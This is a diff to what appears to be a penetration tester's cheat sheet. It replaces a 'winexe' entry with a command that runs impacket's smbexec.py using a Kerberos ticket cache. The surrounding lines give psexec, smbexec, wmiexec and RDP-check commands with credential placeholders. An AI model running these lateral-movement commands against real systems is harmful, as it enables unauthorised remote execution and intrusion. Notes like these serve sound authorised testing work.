@@ -3,7 +3,7 @@
 `impacket-psexec '<DOMAIN>/<USER>:<PASS>@<IP>'`
 `impacket-smbexec '<DOMAIN>/<USER>:<PASS>@<IP>'`
 `impacket-wmiexec '<DOMAIN>/<USER>:<PASS>@<IP>'`
-winexe
+`KRB5CCNAME='<CCACHE>' python3 ~/Desktop/OPSEC/tools/impacket/examples/smbexec.py -k -no-pass <DOMAIN>/<USER>@<TARGET>`
 
 ## RDP: 3389
 `impacket-rdp_check '<DOMAIN>/<USER>:<PASS>@<IP>'` check
